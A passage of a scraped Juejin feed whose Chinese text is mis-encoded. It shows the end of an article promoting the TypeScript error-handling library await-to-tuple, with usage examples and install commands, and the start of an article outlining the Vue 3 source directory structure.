  <span class="hljs-keyword">const</span> [ok1, err1, user] = <span class="hljs-keyword">await</span> <span class="hljs-title function_">to</span>(<span class="hljs-title function_">fetchUser</span>(userId));
  <span class="hljs-keyword">if</span> (!ok1) <span class="hljs-keyword">return</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'è·å–ç”¨æˆ·å¤±è´¥:'</span>, err1.<span class="hljs-property">message</span>);

  <span class="hljs-keyword">const</span> [ok2, err2, posts] = <span class="hljs-keyword">await</span> <span class="hljs-title function_">to</span>(<span class="hljs-title function_">fetchPosts</span>(user.<span class="hljs-property">id</span>));
  <span class="hljs-keyword">if</span> (!ok2) <span class="hljs-keyword">return</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'è·å–æ–‡ç« å¤±è´¥:'</span>, err2.<span class="hljs-property">message</span>);

  <span class="hljs-keyword">const</span> [ok3, err3, comments] = <span class="hljs-keyword">await</span> <span class="hljs-title function_">to</span>(<span class="hljs-title function_">fetchComments</span>(posts[<span class="hljs-number">0</span>].<span class="hljs-property">id</span>));
  <span class="hljs-keyword">if</span> (!ok3) <span class="hljs-keyword">return</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'è·å–è¯„è®ºå¤±è´¥:'</span>, err3.<span class="hljs-property">message</span>);

  <span class="hljs-title function_">render</span>(user, posts, comments);
}
</code></pre>
<p><strong>ä» 47 è¡Œå˜æˆ 12 è¡Œã€‚</strong> é€»è¾‘æ¸…æ™°ï¼Œé”™è¯¯å¤„ç†ç´§è·Ÿåœ¨è°ƒç”¨åé¢ï¼Œä¸€ç›®äº†ç„¶ã€‚</p>
<h3 data-id="heading-7">ç±»å‹å®‰å…¨æ˜¯é‡ç‚¹</h3>
<p><code>await-to-tuple</code> å®Œå…¨ç”¨ TypeScript å†™çš„ï¼Œç±»å‹æ¨å¯¼éå¸¸å‡†ç¡®ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> [ok, err, user] = <span class="hljs-keyword">await</span> <span class="hljs-title function_">to</span>(<span class="hljs-title function_">fetchUser</span>(id));

<span class="hljs-keyword">if</span> (!ok) {
  <span class="hljs-comment">// è¿™é‡Œ TypeScript çŸ¥é“ï¼š</span>
  <span class="hljs-comment">// - err æ˜¯ SafeErrorï¼ˆé nullï¼‰</span>
  <span class="hljs-comment">// - user æ˜¯ null</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err.<span class="hljs-property">message</span>);
  <span class="hljs-keyword">return</span>;
}

<span class="hljs-comment">// è¿™é‡Œ TypeScript çŸ¥é“ï¼š</span>
<span class="hljs-comment">// - err æ˜¯ null</span>
<span class="hljs-comment">// - user æ˜¯ User ç±»å‹ï¼ˆé nullï¼‰</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user.<span class="hljs-property">name</span>); <span class="hljs-comment">// âœ… ä¸ä¼šæŠ¥é”™</span>
</code></pre>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// TypeScript ç±»å‹æ”¶çª„æ¼”ç¤º</span>
<span class="hljs-keyword">const</span> [ok, err, user] = <span class="hljs-keyword">await</span> <span class="hljs-title function_">to</span>(<span class="hljs-title function_">fetchUser</span>(id));
<span class="hljs-comment">//    ^ok: boolean</span>
<span class="hljs-comment">//         ^err: SafeError | null</span>
<span class="hljs-comment">//              ^user: User | null</span>

<span class="hljs-keyword">if</span> (!ok) {
  <span class="hljs-comment">// âœ… è¿™ä¸ªåˆ†æ”¯é‡Œ TypeScript è‡ªåŠ¨æ¨æ–­ï¼š</span>
  <span class="hljs-comment">// err: SafeError (é nullï¼Œå¯ä»¥å®‰å…¨è®¿é—® .message)</span>
  <span class="hljs-comment">// user: null</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err.<span class="hljs-property">message</span>);  <span class="hljs-comment">// âœ… ä¸æŠ¥é”™</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user.<span class="hljs-property">name</span>);      <span class="hljs-comment">// âŒ æŠ¥é”™ï¼šuser æ˜¯ null</span>
  <span class="hljs-keyword">return</span>;
}

<span class="hljs-comment">// âœ… è¿™ä¸ªåˆ†æ”¯é‡Œ TypeScript è‡ªåŠ¨æ¨æ–­ï¼š</span>
<span class="hljs-comment">// err: null</span>
<span class="hljs-comment">// user: User (é nullï¼Œå¯ä»¥å®‰å…¨è®¿é—®å±æ€§)</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user.<span class="hljs-property">name</span>);        <span class="hljs-comment">// âœ… ä¸æŠ¥é”™</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err.<span class="hljs-property">message</span>);      <span class="hljs-comment">// âŒ æŠ¥é”™ï¼šerr æ˜¯ null</span>
</code></pre>
<h3 data-id="heading-8">ä¸åªæ˜¯å¼‚æ­¥</h3>
<p>åŒæ­¥ä»£ç ä¹Ÿèƒ½ç”¨ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { sync } <span class="hljs-keyword">from</span> <span class="hljs-string">'await-to-tuple'</span>;

<span class="hljs-keyword">const</span> [ok, err, config] = <span class="hljs-title function_">sync</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(jsonString));

<span class="hljs-keyword">if</span> (!ok) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'JSON è§£æå¤±è´¥:'</span>, err.<span class="hljs-property">message</span>);
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">getDefaultConfig</span>();
}

<span class="hljs-keyword">return</span> config;
</code></pre>
<h3 data-id="heading-9">è¿˜æœ‰ä¸€äº›å®ç”¨å·¥å…·</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { to, or, map, pipe } <span class="hljs-keyword">from</span> <span class="hljs-string">'await-to-tuple'</span>;

<span class="hljs-comment">// å¤±è´¥æ—¶ç”¨é»˜è®¤å€¼</span>
<span class="hljs-keyword">const</span> name = <span class="hljs-title function_">or</span>(<span class="hljs-keyword">await</span> <span class="hljs-title function_">to</span>(<span class="hljs-title function_">fetchName</span>()), <span class="hljs-string">'åŒ¿åç”¨æˆ·'</span>);

<span class="hljs-comment">// è½¬æ¢æˆåŠŸçš„ç»“æœ</span>
<span class="hljs-keyword">const</span> upperName = <span class="hljs-title function_">map</span>(<span class="hljs-keyword">await</span> <span class="hljs-title function_">to</span>(<span class="hljs-title function_">fetchName</span>()), <span class="hljs-function"><span class="hljs-params">n</span> =&gt;</span> n.<span class="hljs-title function_">toUpperCase</span>());

<span class="hljs-comment">// é“¾å¼è°ƒç”¨ï¼Œé‡åˆ°é”™è¯¯è‡ªåŠ¨ä¸­æ–­</span>
<span class="hljs-keyword">const</span> [ok, err, result] = <span class="hljs-keyword">await</span> <span class="hljs-title function_">pipe</span>(
  userId,
  fetchUser,
  validateUser,
  saveUser
);
</code></pre>
<h3 data-id="heading-10">å’Œå…¶ä»–æ–¹æ¡ˆçš„å¯¹æ¯”</h3>






























<table><thead><tr><th>æ–¹æ¡ˆ</th><th>ä¼˜ç‚¹</th><th>ç¼ºç‚¹</th></tr></thead><tbody><tr><td>try/catch</td><td>åŸç”Ÿæ”¯æŒ</td><td>å†—é•¿ã€æ‰“æ–­é€»è¾‘ã€ç±»å‹ä¸å®‰å…¨</td></tr><tr><td>await-to-js</td><td>ç®€æ´</td><td>äºŒå…ƒç»„æœ‰æ­§ä¹‰</td></tr><tr><td><strong>await-to-tuple</strong></td><td>ä¸‰å…ƒç»„æ— æ­§ä¹‰ã€ç±»å‹å®‰å…¨ã€å·¥å…·ä¸°å¯Œ</td><td>éœ€è¦å®‰è£…ä¾èµ–</td></tr><tr><td>TC39 try æ“ä½œç¬¦ææ¡ˆ</td><td>è¯­è¨€åŸç”Ÿ</td><td>è¿˜åœ¨ Stage 1ï¼Œé¥é¥æ— æœŸ</td></tr></tbody></table>
<h3 data-id="heading-11">ç«‹å³å¼€å§‹</h3>
<h4 data-id="heading-12">å®‰è£…</h4>
<p>é€‰æ‹©ä½ å–œæ¬¢çš„åŒ…ç®¡ç†å™¨ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># npm</span>
npm install await-to-tuple

<span class="hljs-comment"># pnpmï¼ˆæ¨èï¼‰</span>
pnpm add await-to-tuple

<span class="hljs-comment"># yarn</span>
yarn add await-to-tuple
</code></pre>
<h4 data-id="heading-13">åŸºç¡€ç”¨æ³•</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { to, sync } <span class="hljs-keyword">from</span> <span class="hljs-string">'await-to-tuple'</span>;

<span class="hljs-comment">// å¼‚æ­¥æ“ä½œ</span>
<span class="hljs-keyword">const</span> [ok, err, data] = <span class="hljs-keyword">await</span> <span class="hljs-title function_">to</span>(<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/users'</span>));
<span class="hljs-keyword">if</span> (!ok) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'è¯·æ±‚å¤±è´¥:'</span>, err.<span class="hljs-property">message</span>);
  <span class="hljs-keyword">return</span>;
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);

<span class="hljs-comment">// åŒæ­¥æ“ä½œ</span>
<span class="hljs-keyword">const</span> [ok2, err2, json] = <span class="hljs-title function_">sync</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(str));
<span class="hljs-keyword">if</span> (!ok2) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'è§£æå¤±è´¥:'</span>, err2.<span class="hljs-property">message</span>);
  <span class="hljs-keyword">return</span>;
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(json);
</code></pre>
<h4 data-id="heading-14">å®Œæ•´ API</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { 
  to,      <span class="hljs-comment">// åŒ…è£… Promise</span>
  sync,    <span class="hljs-comment">// åŒ…è£…åŒæ­¥å‡½æ•°</span>
  or,      <span class="hljs-comment">// è·å–å€¼æˆ–é»˜è®¤å€¼</span>
  map,     <span class="hljs-comment">// è½¬æ¢æˆåŠŸç»“æœ</span>
  pipe,    <span class="hljs-comment">// é“¾å¼è°ƒç”¨</span>
} <span class="hljs-keyword">from</span> <span class="hljs-string">'await-to-tuple'</span>;

<span class="hljs-comment">// åˆ«åä¹Ÿå¯ä»¥ç”¨</span>
<span class="hljs-keyword">import</span> { 
  go,        <span class="hljs-comment">// = to</span>
  safeAwait, <span class="hljs-comment">// = to</span>
  safeCall,  <span class="hljs-comment">// = sync</span>
  unwrapOr,  <span class="hljs-comment">// = or</span>
  safePipe,  <span class="hljs-comment">// = pipe</span>
} <span class="hljs-keyword">from</span> <span class="hljs-string">'await-to-tuple'</span>;
</code></pre>
<h4 data-id="heading-15">é›¶ä¾èµ–ï¼Œè¶…è½»é‡</h4>
<ul>
<li>ğŸ“¦ gzip å &lt; 1KB</li>
<li>ğŸŒ³ å®Œå…¨ Tree-shakeable</li>
<li>ğŸ”· 100% TypeScriptï¼Œç±»å‹å®Œå¤‡</li>
<li>âœ… å®Œæ•´æµ‹è¯•è¦†ç›–</li>
</ul>
<hr/>
<h3 data-id="heading-16">é“¾æ¥</h3>
<ul>
<li>ğŸ“¦ <strong>npm</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fawait-to-tuple" target="_blank" title="https://www.npmjs.com/package/await-to-tuple" ref="nofollow noopener noreferrer">www.npmjs.com/package/awaâ€¦</a></li>
<li>ğŸ™ <strong>GitHub</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fasdzbb123%2Fawait-to-tuple" target="_blank" title="https://github.com/asdzbb123/await-to-tuple" ref="nofollow noopener noreferrer">github.com/asdzbb123/aâ€¦</a></li>
</ul>
<hr/>
<h3 data-id="heading-17">å†™åœ¨æœ€å</h3>
<p>é”™è¯¯å¤„ç†ä¸åº”è¯¥æ˜¯ä»£ç é‡Œæœ€ä¸‘çš„éƒ¨åˆ†ã€‚</p>
<p><code>await-to-tuple</code> ä¸æ˜¯ä»€ä¹ˆé©å‘½æ€§çš„ä¸œè¥¿ï¼Œå®ƒåªæ˜¯æŠŠä¸€ä¸ªç®€å•çš„æƒ³æ³•â€”â€”<strong>é”™è¯¯æ˜¯å€¼ï¼Œä¸æ˜¯å¼‚å¸¸</strong>â€”â€”ç”¨æœ€å°çš„ä»£ç é‡å®ç°å‡ºæ¥ã€‚</p>
<p>å¦‚æœä½ ä¹Ÿå—å¤Ÿäº† try/catchï¼Œä¸å¦¨è¯•è¯•ã€‚</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> [ok, err, future] = <span class="hljs-keyword">await</span> <span class="hljs-title function_">to</span>(<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'æ›´å¥½çš„ä»£ç '</span>));
</code></pre>
<hr/>
<p><strong>å¦‚æœè¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©ï¼š</strong></p>
<ul>
<li>â­ ç»™ä¸ª Starï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fasdzbb123%2Fawait-to-tuple" target="_blank" title="https://github.com/asdzbb123/await-to-tuple" ref="nofollow noopener noreferrer">github.com/asdzbb123/aâ€¦</a></li>
<li>ğŸ“¦ npm å®‰è£…è¯•è¯•ï¼š<code>npm install await-to-tuple</code></li>
<li>ğŸ’¬ æœ‰é—®é¢˜æ¬¢è¿æ Issue</li>
</ul>
<p>è®©æˆ‘ä»¬ä¸€èµ·å‘Šåˆ« try/catch åœ°ç‹± ğŸ‰</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue 3 æºç é¡¹ç›®ç»“æ„è¯¦è§£]]></title>    <link>https://juejin.cn/post/7583992239102705716</link>    <guid>https://juejin.cn/post/7583992239102705716</guid>    <pubDate>2025-12-16T04:06:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583992239102705716" data-draft-id="7583971282892537908" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue 3 æºç é¡¹ç›®ç»“æ„è¯¦è§£"/> <meta itemprop="keywords" content="Vue.js,å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-16T04:06:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å‰ç«¯æ°´å¾ˆæ·±"/> <meta itemprop="url" content="https://juejin.cn/user/3562890820588077"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue 3 æºç é¡¹ç›®ç»“æ„è¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3562890820588077/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å‰ç«¯æ°´å¾ˆæ·±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T04:06:47.000Z" title="Tue Dec 16 2025 04:06:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>åŸºäºç‰ˆæœ¬ï¼šVue 3.5.25</strong></p>
<p><strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fvuejs%2Fcore%2Ftree%2Fv3.5.25" target="_blank" title="https://github.com/vuejs/core/tree/v3.5.25" ref="nofollow noopener noreferrer">æºç åœ°å€</a></strong></p>
<h2 data-id="heading-0">1. é¡¹ç›®æ¦‚è§ˆ</h2>
<p>Vue 3 æ˜¯ä¸€ä¸ªæ¸è¿›å¼ JavaScript æ¡†æ¶ï¼Œç”¨äºæ„å»ºç”¨æˆ·ç•Œé¢ã€‚å®ƒé‡‡ç”¨äº†æ¨¡å—åŒ–çš„æ¶æ„è®¾è®¡ï¼Œå°†æ ¸å¿ƒåŠŸèƒ½æ‹†åˆ†ä¸ºå¤šä¸ªç‹¬ç«‹çš„åŒ…ï¼Œä»¥å®ç°æ›´å¥½çš„ä»£ç ç»„ç»‡ã€å¯ç»´æŠ¤æ€§å’ŒæŒ‰éœ€å¼•å…¥ã€‚</p>
<h2 data-id="heading-1">2. æ ¹ç›®å½•ç»“æ„</h2>
<pre><code class="hljs language-bash" lang="bash">vuejs/core/
â”œâ”€â”€ .github/            <span class="hljs-comment"># GitHub é…ç½®æ–‡ä»¶</span>
â”œâ”€â”€ .vscode/            <span class="hljs-comment"># VSCode é…ç½®æ–‡ä»¶</span>
â”œâ”€â”€ .well-known/        <span class="hljs-comment"># çŸ¥åé…ç½®æ–‡ä»¶</span>
â”œâ”€â”€ changelogs/         <span class="hljs-comment"># ç‰ˆæœ¬å˜æ›´æ—¥å¿—</span>
â”œâ”€â”€ packages/           <span class="hljs-comment"># æ ¸å¿ƒåŒ…ç›®å½•</span>
â”œâ”€â”€ packages-private/   <span class="hljs-comment"># ç§æœ‰åŒ…ç›®å½•ï¼ˆæµ‹è¯•ã€å·¥å…·ç­‰ï¼‰</span>
â”œâ”€â”€ scripts/            <span class="hljs-comment"># æ„å»ºå’Œå¼€å‘è„šæœ¬</span>
â”œâ”€â”€ .git-blame-ignore-revs <span class="hljs-comment"># Git blame å¿½ç•¥æ–‡ä»¶</span>
â”œâ”€â”€ .gitignore          <span class="hljs-comment"># Git å¿½ç•¥æ–‡ä»¶</span>
â”œâ”€â”€ .node-version       <span class="hljs-comment"># Node.js ç‰ˆæœ¬è¦æ±‚</span>
â”œâ”€â”€ .prettierignore     <span class="hljs-comment"># Prettier å¿½ç•¥æ–‡ä»¶</span>
â”œâ”€â”€ .prettierrc         <span class="hljs-comment"># Prettier é…ç½®</span>
â”œâ”€â”€ BACKERS.md          <span class="hljs-comment"># æ”¯æŒè€…åˆ—è¡¨</span>
â”œâ”€â”€ CHANGELOG.md        <span class="hljs-comment"># ä¸»å˜æ›´æ—¥å¿—</span>
â”œâ”€â”€ FUNDING.json        <span class="hljs-comment"># èµ„åŠ©ä¿¡æ¯</span>
â”œâ”€â”€ LICENSE             <span class="hljs-comment"># è®¸å¯è¯</span>
â”œâ”€â”€ README.md           <span class="hljs-comment"># é¡¹ç›®è¯´æ˜</span>
â”œâ”€â”€ SECURITY.md         <span class="hljs-comment"># å®‰å…¨ä¿¡æ¯</span>
â”œâ”€â”€ eslint.config.js    <span class="hljs-comment"># ESLint é…ç½®</span>
â”œâ”€â”€ netlify.toml        <span class="hljs-comment"># Netlify é…ç½®</span>
â”œâ”€â”€ package.json        <span class="hljs-comment"># é¡¹ç›®ä¾èµ–å’Œè„šæœ¬</span>
</code></pre>
<h2 data-id="heading-2">3. æ ¸å¿ƒåŒ…ç»“æ„ (packages/)</h2>
<p>Vue 3 çš„æ ¸å¿ƒåŠŸèƒ½è¢«æ‹†åˆ†ä¸ºå¤šä¸ªç‹¬ç«‹çš„åŒ…ï¼Œæ¯ä¸ªåŒ…è´Ÿè´£ç‰¹å®šçš„åŠŸèƒ½åŸŸã€‚</p>
<h3 data-id="heading-3">3.1 compiler-core</h3>
<p>æ ¸å¿ƒç¼–è¯‘å™¨ï¼Œæä¾›è·¨å¹³å°çš„ç¼–è¯‘èƒ½åŠ›ï¼Œä¸å…·ä½“æ¸²æŸ“ç›®æ ‡æ— å…³ã€‚</p>
<pre><code class="hljs language-python" lang="python">compiler-core/
â”œâ”€â”€ __tests__/          <span class="hljs-comment"># æµ‹è¯•æ–‡ä»¶</span>
â”œâ”€â”€ src/
â”‚   â”œâ”€â”€ compat/         <span class="hljs-comment"># å…¼å®¹æ€§å¤„ç†</span>
â”‚   â”œâ”€â”€ transforms/     <span class="hljs-comment"># AST è½¬æ¢æ’ä»¶</span>
â”‚   â”œâ”€â”€ ast.ts          <span class="hljs-comment"># AST èŠ‚ç‚¹å®šä¹‰</span>
â”‚   â”œâ”€â”€ codegen.ts      <span class="hljs-comment"># ä»£ç ç”Ÿæˆå™¨</span>
â”‚   â”œâ”€â”€ <span class="hljs-built_in">compile</span>.ts      <span class="hljs-comment"># ç¼–è¯‘ä¸»å‡½æ•°</span>
â”‚   â”œâ”€â”€ parser.ts       <span class="hljs-comment"># æ¨¡æ¿è§£æå™¨</span>
â”‚   â””â”€â”€ transform.ts    <span class="hljs-comment"># AST è½¬æ¢å™¨</span>
â”œâ”€â”€ LICENSE
â”œâ”€â”€ README.md
â””â”€â”€ package.json
</code></pre>
<h3 data-id="heading-4">3.2 compiler-dom</h3>
<p>DOM ç¼–è¯‘å™¨ï¼ŒåŸºäº compiler-core æ‰©å±•ï¼Œç”¨äºå°†æ¨¡æ¿ç¼–è¯‘ä¸º DOM æ¸²æŸ“å‡½æ•°ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">compiler-dom/
â”œâ”€â”€ __tests__/          <span class="hljs-comment"># æµ‹è¯•æ–‡ä»¶</span>
â”œâ”€â”€ src/
â”‚   â”œâ”€â”€ transforms/     <span class="hljs-comment"># DOM ç‰¹å®šè½¬æ¢</span>
â”‚   â””â”€â”€ index.ts        <span class="hljs-comment"># å…¥å£æ–‡ä»¶</span>
â”œâ”€â”€ LICENSE
â”œâ”€â”€ README.md
â””â”€â”€ package.json
</code></pre>
<h3 data-id="heading-5">3.3 compiler-sfc</h3>
<p>å•æ–‡ä»¶ç»„ä»¶ (SFC) ç¼–è¯‘å™¨ï¼Œç”¨äºç¼–è¯‘ .vue æ–‡ä»¶ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">compiler-sfc/
â”œâ”€â”€ __tests__/          <span class="hljs-comment"># æµ‹è¯•æ–‡ä»¶</span>
â”œâ”€â”€ src/
â”‚   â”œâ”€â”€ script/         <span class="hljs-comment"># è„šæœ¬å¤„ç†</span>
â”‚   â”œâ”€â”€ style/          <span class="hljs-comment"># æ ·å¼å¤„ç†</span>
â”‚   â”œâ”€â”€ template/       <span class="hljs-comment"># æ¨¡æ¿å¤„ç†</span>
â”‚   â”œâ”€â”€ compileScript.ts <span class="hljs-comment"># è„šæœ¬ç¼–è¯‘</span>
â”‚   â”œâ”€â”€ compileStyle.ts <span class="hljs-comment"># æ ·å¼ç¼–è¯‘</span>
â”‚   â”œâ”€â”€ compileTemplate.ts <span class="hljs-comment"># æ¨¡æ¿ç¼–è¯‘</span>
â”‚   â””â”€â”€ parse.ts        <span class="hljs-comment"># SFC è§£æå™¨</span>
â”œâ”€â”€ LICENSE
â”œâ”€â”€ README.md
â””â”€â”€ package.json
</code></pre>
<h3 data-id="heading-6">3.4 compiler-ssr</h3>
<p>æœåŠ¡ç«¯æ¸²æŸ“ (SSR) ç¼–è¯‘å™¨ï¼Œç”¨äºå°†æ¨¡æ¿ç¼–è¯‘ä¸º SSR æ¸²æŸ“å‡½æ•°ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">compiler-ssr/
â”œâ”€â”€ __tests__/          <span class="hljs-comment"># æµ‹è¯•æ–‡ä»¶</span>
â”œâ”€â”€ src/
â”‚   â”œâ”€â”€ transforms/     <span class="hljs-comment"># SSR ç‰¹å®šè½¬æ¢</span>
â”‚   â””â”€â”€ index.ts        <span class="hljs-comment"># å…¥å£æ–‡ä»¶</span>
â”œâ”€â”€ LICENSE
â”œâ”€â”€ README.md
